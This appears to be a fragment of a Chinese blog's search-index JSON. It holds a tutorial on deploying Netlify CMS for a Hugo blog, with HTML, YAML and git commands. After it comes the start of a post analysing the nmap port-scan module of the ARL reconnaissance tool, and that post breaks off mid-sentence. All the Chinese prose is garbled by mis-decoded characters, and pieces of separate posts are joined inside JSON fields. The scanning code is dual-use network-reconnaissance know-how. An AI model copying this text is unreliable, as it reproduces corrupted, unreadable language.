æŠŠå½“å‰å†…å®¹å…¨éƒ¨åˆ é™¤ï¼Œå¾—åˆ°ä¸€ä¸ªç©ºåˆ†æ”¯ å½“ç„¶ï¼Œä½ å¯ä»¥ç”¨ä½ è‡ªå·±ä¹ æƒ¯çš„åŠæ³•åˆ›å»ºä¸€ä¸ªæ–°åˆ†æ”¯ç„¶ååˆ é™¤æ‰€æœ‰çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬åªéœ€è¦æœ‰ä¸€ä¸ªæ–°åˆ†æ”¯ï¼Œè¿™ä¸ªåˆ†æ”¯ä¸Šæ²¡æœ‰ä»»ä½•æ–‡ä»¶ã€‚\nåˆ›å»º Netlify CMS æ‰€éœ€çš„æ–‡ä»¶ æˆ‘ä»¬éœ€è¦åˆ›å»ºä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ª index.htmlï¼Œä¸€ä¸ª config.yml\nindex.html 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34; /\u0026gt; \u0026lt;script src=\u0026#34; https://identity.netlify.com/v1/netlify-identity-widget.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;title\u0026gt;Content Manager\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!-- Include the script that builds the page and powers Netlify CMS --\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/npm/netlify-cms@2.10.192/dist/netlify-cms.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; if (window.netlifyIdentity) { window.netlifyIdentity.on(\u0026#34;init\u0026#34;, user =\u0026gt; { if (!user) { window.netlifyIdentity.on(\u0026#34;login\u0026#34;, () =\u0026gt; { document.location.href = \u0026#34;/\u0026#34;; }); } }); } \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; config.yml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 backend: name: git-gateway branch: hugo # Branch to update (optional; defaults to master) squash_merges: true # This line should *not* be indented publish_mode: editorial_workflow # These lines should *not* be indented media_folder: \u0026#34;static/images/uploads\u0026#34; # Media files will be stored in the repo under static/images/uploads public_folder: \u0026#34;/images/uploads\u0026#34; # The src attribute for uploaded media will begin with /images/uploads collections: - name: \u0026#34;post\u0026#34; # Used in routes, e.g., /admin/collections/blog label: \u0026#34;Blog posts\u0026#34; # Used in the UI folder: \u0026#34;content/posts\u0026#34; # The path to the folder where the documents are stored extension: md create: true # Allow users to create new documents in this collection slug: \u0026#34;{{year}}-{{month}}-{{day}}-{{slug}}\u0026#34; # Filename template, e.g., YYYY-MM-DD-title.md fields: # The fields for each document, usually in front matter - {label: \u0026#34;Layout\u0026#34;, name: \u0026#34;layout\u0026#34;, widget: \u0026#34;hidden\u0026#34;, default: \u0026#34;blog\u0026#34;} - {label: \u0026#34;Title\u0026#34;, name: \u0026#34;title\u0026#34;, widget: \u0026#34;string\u0026#34;} - {label: \u0026#34;Publish Date\u0026#34;, name: \u0026#34;date\u0026#34;, widget: \u0026#34;datetime\u0026#34;} - {label: \u0026#34;Show TOC\u0026#34;, name: \u0026#34;showToc\u0026#34;, widget: \u0026#34;boolean\u0026#34;, default: true} - {label: \u0026#34;Draft\u0026#34;, name: \u0026#34;draft\u0026#34;, widget: \u0026#34;boolean\u0026#34;, required: false, default: false} - {label: \u0026#34;Description\u0026#34;, name: \u0026#34;description\u0026#34;, widget: \u0026#34;string\u0026#34;, required: false} - widget: object name: cover label: Cover required: false fields: - {label: Image, name: image, widget: string, required: false, comment: image path/url} - {label: Alt, name: alt, widget: string, required: false, comment: alt text} - {label: Caption, name: caption, widget: string, required: false, comment: display caption under cover} - {label: Relative, name: relative, widget: string, required: false, comment: when using page bundles set this to true} - {label: Hidden, name: hidden, widget: \u0026#34;hidden\u0026#34;, required: false, default: false, comment: only hide on current single page} - {label: \u0026#34;Body\u0026#34;, name: \u0026#34;body\u0026#34;, widget: \u0026#34;markdown\u0026#34;} backend.name: è¿™ä¸ªä¸»è¦æ˜¯å’Œè®¤è¯ç›¸å…³\nbackend.branch: è¿™æ˜¯ä¸»è¦æ˜¯æŒ‡æ˜ä½ çš„åšå®¢æºæ–‡ä»¶ï¼ˆç¼–å†™ markdownï¼‰çš„åˆ†æ”¯\nbackend.squash_merges: è¿™ä¸ªä¸»è¦æ˜¯å½“ä¸‹é¢è®¾ç½® publish_mode: editorial_workflow æ—¶ï¼Œä¼šå¯ç”¨ç¼–è¾‘æ–‡ä»¶çš„å·¥ä½œæµï¼Œå¯ç”¨è¯¥å·¥ä½œæµåï¼Œä½ ç¼–è¾‘åšå®¢åï¼Œå¯ä»¥ä¿å­˜ï¼ŒNetlify CMS ä¼šè‡ªåŠ¨å°†ä½ ä¿å­˜ä½†æœªå‘å¸ƒçš„ markdown æ”¾ç½®åˆ°ä¸€ä¸ªæ–°å»ºçš„åˆ†æ”¯ä¸­å»ï¼Œç„¶åä½ å¯ä»¥å¤šæ¬¡ç¼–è¾‘ä¿å­˜ï¼Œä¼šåœ¨è¯¥åˆ†æ”¯ä¸Šç”Ÿæˆå¤šæ¬¡ commitï¼Œç­‰å¾…ä½ å‘å¸ƒçš„æ—¶å€™ï¼Œä¼šåˆå¹¶åˆ°ä½ çš„ backend.branch åˆ†æ”¯ä¸Šå»ï¼Œå¯ç”¨ squash_merges åï¼Œä¼šå°†ä½ çš„å¤šæ¬¡ç¼–è¾‘ commit åˆå¹¶æˆä¸€ä¸ªæäº¤åˆå¹¶ä¸Šå»\nmedia_folder: æŒ‡æ˜ä½ çš„é™æ€æ–‡ä»¶å®é™…ä¿å­˜åœ¨å“ªé‡Œï¼ˆåœ¨åšå®¢æºæ–‡ä»¶åˆ†æ”¯ä¸­ï¼‰\npublic_folder: æŒ‡æ˜ä½ çš„é™æ€æ–‡ä»¶åœ¨å‘å¸ƒåˆ†æ”¯ï¼ˆå³åšå®¢æ„å»ºéƒ¨ç½²ç”Ÿæˆhtmlçš„åˆ†æ”¯ï¼‰çš„ä½ç½®\ncollections: è¯¥é…ç½®å®šä¹‰äº†ä½ çš„ç«™ç‚¹éœ€è¦ç¼–è¾‘çš„æ–‡ä»¶çš„ç»“æ„ï¼Œæ¯”å¦‚æˆ‘éœ€è¦ç¼–è¾‘æˆ‘çš„åšå®¢ postsï¼Œæˆ‘å°±å»ºç«‹äº†ä¸€ä¸ª name: \u0026quot;post\u0026quot; çš„ collection\nlabel: \u0026quot;Blog posts\u0026quot;: åœ¨NetlifyCMSä¸­æ˜¾ç¤ºçš„æ ‡é¢˜ï¼Œéšä¾¿å¡« folder: \u0026quot;content/posts\u0026quot;: ä½ çš„åšæ–‡æ–‡ä»¶æ”¾åœ¨å“ª extension: md: ä½ çš„åšæ–‡çš„åç¼€æ˜¯ä»€ä¹ˆï¼Œä¸€èˆ¬æ˜¯ md slug: \u0026quot;{{year}}-{{month}}-{{day}}-{{slug}}\u0026quot;: åšæ–‡æ–‡ä»¶å‘½åæ ¼å¼ fields: è¯¥é…ç½®ä¸‹é¢æ”¾ç½®ä½ çš„åšæ–‡headerçš„é…ç½®ï¼Œè¿™éƒ¨åˆ†é…ç½®çš„ç»†èŠ‚å¯ä»¥æŸ¥çœ‹å®˜æ–¹å…³äºè¿™éƒ¨åˆ†å†…å®¹çš„è¯´æ˜ (https://www.netlifycms.org/docs/add-to-your-site/#collections) é…ç½®å®Œæˆåï¼Œå°†è¿™äº›æ–‡ä»¶å‘å¸ƒåˆ°ä½ ä»“åº“çš„ netlifycms åˆ†æ”¯ä¸‹ï¼Œæ ·ä¾‹å¯å‚è§ https://github.com/akkuman/akkuman.github.io/tree/netlifycms, å¦‚æœæˆ‘è¿™è¾¹æ–‡ç« æåˆ°çš„åˆ†æ”¯å·²ç»ä¸å­˜åœ¨ï¼Œå¯ä»¥æŸ¥çœ‹è¯¥ commit https://github.com/akkuman/akkuman.github.io/tree/de1cc353fd345870f8e0d148593d6ee86132152b\nNetlifyCMS é…ç½® é…ç½®å¥½ä¸Šé¢çš„å†…å®¹åï¼Œæˆ‘ä»¬éœ€è¦åœ¨ Netlify ä¸Šåšç›¸å…³çš„ç½‘ç«™é…ç½®\né¦–å…ˆæˆ‘ä»¬æ‰“å¼€ç½‘ç«™ https://netlify.app/ å¹¶æ³¨å†Œç™»å½•ï¼Œæ‰“å¼€ä¸ªäººèµ„æ–™é…ç½®ç•Œé¢\nhttps://app.netlify.com/user/settings#connected-accountsï¼Œå…³è”ä½ çš„githubè´¦å·\nç„¶åæ‰“å¼€ä½ çš„ä¸»é¡µï¼ŒæŒ‰ç…§ä¸‹å›¾åˆ›å»ºä¸€ä¸ªç«™ç‚¹\nç„¶åç‚¹å‡»ä»githubå¯¼å…¥\né€‰æ‹©ä½ çš„åšå®¢ä»“åº“ï¼Œæ¥ç€æŒ‰ç…§ä¸‹å›¾é…ç½®\nå…¶ä¸­ Branch to deploy é€‰æ‹©æˆ‘ä»¬åˆšæ‰ä¸º NetlifyCMS å»ºç«‹çš„åˆ†æ”¯ï¼Œéƒ¨ç½²ç›¸å…³çš„å†…å®¹å…¨éƒ¨ç½®ç©ºï¼Œç„¶åç‚¹å‡» Deploy Siteï¼Œç„¶åä½ ä¼šçœ‹åˆ°è¿™ä¸ªé¡µé¢\nç­‰å¾…ç«™ç‚¹éƒ¨ç½²å®Œæˆåï¼Œä½ å¯ä»¥çœ‹åˆ°netlifyç»™ä½ æä¾›çš„ç½‘ç«™ï¼Œç±»ä¼¼äº xxxx.netlify.appï¼Œç‚¹å‡» Site settingsï¼Œä½ å¯ä»¥åœ¨ Site details -\u0026gt; Site information æ›´æ”¹ä½ çš„urlã€‚\nè®¿é—®è¿™ä¸ªç½‘ç«™ï¼Œä¼šæç¤ºä½ æ— æ³•ç™»å½•\næˆ‘ä»¬æ‰“å¼€ Site settings -\u0026gt; Identity ç„¶åå¯ç”¨èº«ä»½è®¤è¯\né¦–å…ˆæˆ‘ä»¬éœ€è¦å…³é—­æ³¨å†ŒåŠŸèƒ½ï¼Œåªèƒ½é‚€è¯·ï¼Œå¦åˆ™æˆ‘ä»¬çš„ NetlifyCMS å¯èƒ½ä¼šè¢«äººæ»¥ç”¨\næˆ‘ä»¬è¿›å…¥èº«ä»½ç®¡ç†é‚€è¯·ä¸€ä¸ªç”¨æˆ·ï¼Œå¡«å…¥é‚®ç®±\nç„¶åä½ çš„é‚®ç®±é‡Œé¢åº”è¯¥ä¼šæ”¶åˆ°ä¸€ä¸ªé‚€è¯·é“¾æ¥ï¼Œè®¿é—®åè®¾ç½®ä¸Šå¯†ç ã€‚\næ­¤æ—¶ä½ åº”è¯¥è¿˜æ˜¯æ— æ³•ç™»å½•ï¼Œä¼šæç¤ºä½ éœ€è¦å…ˆé…ç½® git-gatewayã€‚\næˆ‘ä»¬æ‰“å¼€ Site settings -\u0026gt; Identity -\u0026gt; Services -\u0026gt; Git Gatewayï¼Œç„¶åå¯ç”¨ï¼ˆEnable Git Gatewayï¼‰\nç°åœ¨ä½ å†è¿›å…¥ä½ é…ç½®çš„ NetlifyCMSï¼Œç°åœ¨ä½ å¯ä»¥çœ‹åˆ°ä½ çš„åšå®¢ç®¡ç†åå°äº†ã€‚\nåŠŸèƒ½æ¯”è¾ƒç®€å•ï¼Œå°±ä¸ä»‹ç»å¦‚ä½•ä½¿ç”¨äº†ã€‚\nå› ä¸ºæˆ‘ä»¬åœ¨é…ç½®ä¸­å¯ç”¨äº†å·¥ä½œæµï¼Œä½ å¯ä»¥å°è¯•å°è¯•å¦‚ä½•ä½¿ç”¨ï¼Œå…·ä½“åŸç†æ˜¯ NetlifyCMS ä¼šç»™ä½ æ–°å»ºä¸€ä¸ªåˆ†æ”¯æ¥ä¿å­˜è¿˜æœªå‘å¸ƒçš„åœ¨å·¥ä½œæµä¸­çš„æ–‡ç« ï¼Œç­‰å¾…å‘å¸ƒåä¼šåˆå¹¶ä¸Šå»ï¼Œè¯¦ç»†ç»†èŠ‚å¯ä»¥è‡ªè¡Œç ”ç©¶ã€‚\n","permalink":"https://www.hacktech.cn/post/2022-06-25-hugo-netlifycms%E9%83%A8%E7%BD%B2.html","summary":"\u003cp\u003eç½‘ä¸Šçš„åšå®¢å¾ˆå¤šå…³äºNetlify CMSçš„éƒ¨ç½²éƒ½æ˜¯ä½¿ç”¨äº†Netlifyçš„æœåŠ¡ï¼Œå› ä¸ºæˆ‘è‡ªå·±çš„åšå®¢å·²ç»ä½¿ç”¨äº†GithubActionä½œä¸ºCIæ¥è‡ªåŠ¨éƒ¨ç½²ï¼Œæˆ‘çš„åšå®¢æºæ–‡ä»¶æ”¾åœ¨hugoåˆ†æ”¯ä¸‹ï¼Œå¯¹hugoåˆ†æ”¯commitä¼šè§¦å‘GithubActionï¼Œç„¶åä½¿ç”¨è¿›è¡Œç½‘ç«™æ„å»ºå¹¶æ¨é€åˆ°masteråˆ†æ”¯ä¸‹ï¼Œå¹¶ä¸”è‡ªå®šä¹‰åŸŸåæ˜¯ä½¿ç”¨çš„å…¶ä»–åŸŸåæä¾›å•†æ¥è§£æçš„ï¼Œæœ¬æ–‡ä¸»è¦æ˜¯è®°å½•ä¸€ä¸‹åœ¨è¿™ç§æƒ…å†µä¸‹æ€ä¹ˆä¸ºåšå®¢æ·»åŠ NetlifyCMS\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"netlify-cms-åšä»€ä¹ˆ\"\u003eNetlify CMS åšä»€ä¹ˆ\u003c/h2\u003e\n\u003cp\u003eå®‰è£…ä¹‹å‰æˆ‘ä»¬éœ€è¦äº†è§£ä¸€ä¸‹Netlify CMSæ˜¯ä»€ä¹ˆã€‚Netlify CMS å’Œ Forestry ç­‰å·¥å…·ä¸€æ ·ï¼Œå®ƒå¯ä»¥å¸®åŠ©ä½ ç®¡ç†ä½ çš„gitä»“åº“ï¼Œæˆ‘ä»¬ä¸€èˆ¬çš„ä¸»è¦ç”¨é€”å°±æ˜¯æ‹¿å®ƒæ¥ç®¡ç†gitä»“åº“ä¸­çš„ blog æºæ–‡ä»¶ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªå‹å¥½çš„ç•Œé¢æ¥å¸®åŠ©ä½ ç¼–å†™ä½ çš„ blog æºæ–‡ä»¶ï¼Œç„¶ååç»­çš„ git commit push å®ƒä¼šå¸®ä½ æ•ˆåŠ³ï¼Œä½ å¯ä»¥æ‹¿å®ƒæ¥ä½œä¸ºCIï¼Œè‡ªåŠ¨å¸®ä½ æ„å»ºå¥½ç½‘ç«™ï¼Œä¹Ÿå¯ä»¥åªä½¿ç”¨ä»–çš„ç¼–è¾‘æ¨é€åŠŸèƒ½ï¼ŒæŠŠå®ƒå½“ä½œä¸€ä¸ªç®¡ç†åå°ï¼Œè®©å…¶ä»–çš„CIæ¥å¸®ä½ åšåé¢çš„äº‹æƒ…ã€‚\u003c/p\u003e\n\u003cp\u003eä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘æœ‰ä¸€ä¸ªåšå®¢æ‰˜ç®¡åœ¨ github pagesï¼Œæ‹¥æœ‰è‡ªå·±çš„CIæ¥è¿›è¡Œåšå®¢éƒ¨ç½²ï¼Œæˆ‘åªéœ€è¦æ¨é€ markdown åšæ–‡æºæ–‡ä»¶åˆ°æŒ‡å®šåˆ†æ”¯ä¸‹ï¼Œå³å¯è§¦å‘æ„å»ºï¼Œä½†æ˜¯æˆ‘ä¸æƒ³æ¯æ¬¡éƒ½åœ¨æœ¬åœ°å†™åšå®¢ï¼Œæˆ‘å¸Œæœ›æœ‰ä¸ªç®€å•çš„æ–¹å¼æ¥è®©æˆ‘éšæ—¶éšåœ°åœ¨çº¿ç¼–è¾‘å‘å¸ƒåšå®¢ï¼Œé‚£æˆ‘å°±å¯ä»¥ä½¿ç”¨ Netlify CMSï¼Œå½“ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ github.devï¼Œä¸è¿‡ç¼ºç‚¹æ˜¯ä½ éœ€è¦å¦å¤–çš„å·¥å…·æ¥å¤„ç†ä½ çš„å›¾ç‰‡ï¼Œå› ä¸º github.dev ä¸æ”¯æŒå›¾ç‰‡ç²˜è´´ï¼ˆç›¸åº”çš„æ’ä»¶ä¹Ÿæ— æ³•å®‰è£…ï¼‰ï¼Œä½†æ˜¯ Netlify CMS èƒ½å¤Ÿé€šè¿‡é…ç½®æ¥å®Œæˆç²˜è´´å›¾ç‰‡çš„åŠŸèƒ½ï¼Œéº»é›€è™½å°äº”è„ä¿±å…¨ã€‚\u003c/p\u003e\n\u003ch2 id=\"å¦‚ä½•éƒ¨ç½²\"\u003eå¦‚ä½•éƒ¨ç½²\u003c/h2\u003e\n\u003cp\u003eå¯èƒ½ä½ çœ‹äº†ä¸å°‘è¯´æ˜æ–‡æ¡£ï¼Œä½†æ˜¯è¿˜æ˜¯å¤„äºä¸å¯ç”¨çš„çŠ¶æ€ã€‚å…¶å®æœ‰å¾ˆå¤§ä¸€éƒ¨åˆ†åŸå› æ˜¯æ²¡æœ‰ä½¿ç”¨ Netlify çš„æœåŠ¡ï¼Œæ¯”å¦‚ä½ çš„è‡ªå®šä¹‰åŸŸåæ²¡æœ‰æ‰˜ç®¡åœ¨ Netlifyã€‚\u003c/p\u003e\n\u003cp\u003eæˆ‘å†³å®šä½¿ç”¨ Netlfify æä¾›ç»™æˆ‘çš„ \u003ccode\u003exxxx.netlify.app\u003c/code\u003e åŸŸåã€‚æœ€ç»ˆæ•ˆæœæ˜¯æˆ‘å¯ä»¥ç›´æ¥è®¿é—®è¯¥åŸŸå(\u003ccode\u003exxxx.netlify.app\u003c/code\u003e) å³å¯ç®¡ç†æˆ‘çš„åšå®¢åå°ã€‚\u003c/p\u003e\n\u003ch3 id=\"å»ºç«‹æ–°åˆ†æ”¯\"\u003eå»ºç«‹æ–°åˆ†æ”¯\u003c/h3\u003e\n\u003cp\u003eä»è¿™é‡Œå¼€å§‹å¯èƒ½ä½ å°±ä¼šå‘ç°å’Œ\u003ca href=\"https://www.netlifycms.org/docs/add-to-your-site/\"\u003eè¯´æ˜æ–‡æ¡£\u003c/a\u003eæœ‰ç‚¹ä¸ä¸€æ ·ã€‚å› ä¸ºæˆ‘ä¸æ‰“ç®—æŠŠå®ƒæ”¾ç½®åœ¨å­æ–‡ä»¶å¤¹ï¼ˆ\u003ccode\u003eadmin\u003c/code\u003eï¼‰ä¸‹ã€‚\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆæˆ‘ä»¬ clone æˆ‘ä»¬çš„åšå®¢ä»“åº“ã€‚æ‹¿æˆ‘è‡ªå·±çš„ä»“åº“ä¸¾ä¾‹å­ï¼Œ\u003ca href=\"https://github.com/akkuman/akkuman.github.io/tree/96f4e480342a806ac633b15909155684eac53319\"\u003ehugo\u003c/a\u003e æ˜¯æˆ‘æ”¾ç½®åšå®¢æºæ–‡ä»¶çš„åˆ†æ”¯ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e2\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit clone git@github.com:akkuman/akkuman.github.io.git\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecd akkuman.github.io\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eç„¶åæˆ‘ä»¬æ–°å»ºä¸€ä¸ªåˆ†æ”¯ç”¨æ¥æ‰˜ç®¡ Netlify CMSã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e2\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit checkout --orphan netlifycms \u003cspan style=\"color:#75715e\"\u003e# æ–°å»ºä¸€ä¸ªæ²¡æœ‰å†å²çš„åˆ†æ”¯\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit rm -rf . \u003cspan style=\"color:#75715e\"\u003e# æŠŠå½“å‰å†…å®¹å…¨éƒ¨åˆ é™¤ï¼Œå¾—åˆ°ä¸€ä¸ªç©ºåˆ†æ”¯\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eå½“ç„¶ï¼Œä½ å¯ä»¥ç”¨ä½ è‡ªå·±ä¹ æƒ¯çš„åŠæ³•åˆ›å»ºä¸€ä¸ªæ–°åˆ†æ”¯ç„¶ååˆ é™¤æ‰€æœ‰çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬åªéœ€è¦æœ‰ä¸€ä¸ªæ–°åˆ†æ”¯ï¼Œè¿™ä¸ªåˆ†æ”¯ä¸Šæ²¡æœ‰ä»»ä½•æ–‡ä»¶ã€‚\u003c/p\u003e","title":"hugo+NetlifyCMSéƒ¨ç½²"},{"content":"ç¯å¡”ï¼ˆARLï¼‰é‡Œé¢æœ‰ä¸€ä¸ªnampæ‰«ææ¨¡å—ï¼Œé‡Œé¢æœ‰é…ç½®å¯ä»¥å­¦ä¹ ä¸€ä¸‹\né¦–å…ˆä¸Šä»£ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 class PortScan: def __init__(self, targets, ports=None, service_detect=False, os_detect=False, port_parallelism=None, port_min_rate=None, custom_host_timeout=None): self.targets = \u0026#34; \u0026#34;.join(targets) self.ports = ports self.max_hostgroup = 128 self.alive_port = \u0026#34;22,80,443,843,3389,8007-8011,8443,9090,8080-8091,8093,8099,5000-5004,2222,3306,1433,21,25\u0026#34; self.nmap_arguments = \u0026#34;-sT -n --open\u0026#34; self.max_retries = 3 self.host_timeout = 60*5 self.parallelism = port_parallelism # é»˜è®¤ 32 self.min_rate = port_min_rate # é»˜è®¤64 if service_detect: self.host_timeout += 60 * 5 self.nmap_arguments += \u0026#34; -sV\u0026#34; if os_detect: self.host_timeout += 60 * 4 self.nmap_arguments += \u0026#34; -O\u0026#34; if len(self.ports.split(\u0026#34;,\u0026#34;)) \u0026gt; 60: self.nmap_arguments += \u0026#34; -PE -PS{}\u0026#34;.format(self.alive_port) self.max_retries = 2 else: if self.ports != \u0026#34;0-65535\u0026#34;: self.nmap_arguments += \u0026#34; -Pn\u0026#34; if self.ports == \u0026#34;0-65535\u0026#34;: self.max_hostgroup = 8 self.min_rate = max(self.min_rate, 400) self.nmap_arguments += \u0026#34; -PE -PS{}\u0026#34;.format(self.alive_port) self.host_timeout += 60 * 2 self.max_retries = 2 self.nmap_arguments += \u0026#34; --max-rtt-timeout 800ms\u0026#34; self.nmap_arguments += \u0026#34; --min-rate {}\u0026#34;.format(self.min_rate) self.nmap_arguments += \u0026#34; --script-timeout 6s\u0026#34; self.nmap_arguments += \u0026#34; --max-hostgroup {}\u0026#34;.format(self.max_hostgroup) # ä¾æ®ä¼ è¿‡æ¥çš„è¶…æ—¶ä¸ºå‡† if custom_host_timeout is not None: if int(custom_host_timeout) \u0026gt; 0: self.host_timeout = custom_host_timeout self.nmap_arguments += \u0026#34; --host-timeout {}s\u0026#34;.format(self.host_timeout) self.nmap_arguments += \u0026#34; --min-parallelism {}\u0026#34;.format(self.parallelism) self.nmap_arguments += \u0026#34; --max-retries {}\u0026#34;.format(self.max_retries) def run(self): logger.info(\u0026#34;nmap target {} ports {} arguments {}\u0026#34;.format( self.targets[:20], self.ports[:20], self.nmap_arguments)) nm = nmap.PortScanner() nm.scan(hosts=self.targets, ports=self.ports, arguments=self.nmap_arguments) ip_info_list = [] for host in nm.all_hosts(): port_info_list = [] for proto in nm[host].all_protocols(): port_len = len(nm[host][proto]) for port in nm[host][proto]: # å¯¹äºå¼€äº†å¾ˆå¤šç«¯å£çš„ç›´æ¥ä¸¢å¼ƒ if port_len \u0026gt; 600 and (port not in [80, 443]): continue port_info = nm[host][proto][port] item = { \u0026#34;port_id\u0026#34;: port, \u0026#34;service_name\u0026#34;: port_info[\u0026#34;name\u0026#34;], \u0026#34;version\u0026#34;: port_info[\u0026#34;version\u0026#34;], \u0026#34;product\u0026#34;: port_info[\u0026#34;product\u0026#34;], \u0026#34;protocol\u0026#34;: proto } port_info_list.append(item) osmatch_list = nm[host].get(\u0026#34;osmatch\u0026#34;, []) os_info = self.os_match_by_accuracy(osmatch_list) ip_info = { \u0026#34;ip\u0026#34;: host, \u0026#34;port_info\u0026#34;: port_info_list, \u0026#34;os_info\u0026#34;: os_info } ip_info_list.append(ip_info) return ip_info_list def os_match_by_accuracy(self, os_match_list): for os_match in os_match_list: accuracy = os_match.get(\u0026#39;accuracy\u0026#39;, \u0026#39;0\u0026#39;) if int(accuracy) \u0026gt; 90: return os_match return {} å…¥å£æ˜¯run\né¦–å…ˆæ˜¯æ‰«æç­–ç•¥çš„é…ç½®\nflowchart TB A[nampæ‰«æ] --\u003e strategy subgraph strategy direction LR B(\"-sT -n --open max_hostgroup=128 max_retries=3 host_timeout=60*5 parallelism=32 min_rate=64\") --\u003e C{\"service_detect?\"} C --\u003e|true| c1[\"add -sV host_timeout+=60*5\"] B --\u003e D{\"os_detect?\"} D --\u003e|true| d1[\"add -O host_timeout+=60*4\"] B --\u003e E{\"len(self.ports.split(',')) \u003e 60?\"} E --\u003e|true| e1[\"add -PE -PS22,80,443,843,3389,8007-8011,8443,9090,8080-8091,8093,8099,5000-5004,2222,3306,1433,21,25 max_retries=2\"] E --\u003e|false| e2{\"ports != '0-65535'?\"} e2 --\u003e|true| ee1[\"add -Pn\"] B --\u003e F{\"ports == '0-65535'?\"} F --\u003e|true| f1[\"add -PE -PS22,80,443,843,3389,8007-8011,8443,9090,8080-8091,8093,8099,5000-5004,2222,3306,1433,21,25 max_hostgroup=8 min_rate=max(self.min_rate, 400) host_timeout+=60 * 2 max_retries=2 \"] end subgraph paramStep direction TB paramStep1[\"--max-rtt-timeout 800ms\"] --\u003e paramStep2[\"--min-rate min_rate\"] paramStep2 --\u003e paramStep3[\"--script-timeout 6s\"] paramStep3 --\u003e paramStep4[\"--max-hostgroup max_hostgroup\"] paramStep4 --\u003e paramStep5[\"--host-timeout host_timeout\"] paramStep5 --\u003e paramStep6[\"--min-parallelism parallelism\"] paramStep6 --\u003e paramStep7[\"--max-retries max_retries\"] end strategy --\u003e paramStep å…¶ä¸­æ¶‰åŠåˆ°çš„é…ç½®\n-sT å…¨è¿æ¥æ‰«æä¼šå’ŒæœåŠ¡å™¨å»ºç«‹å®Œæ•´çš„ä¸‰æ¬¡æ¡æ‰‹\n-n 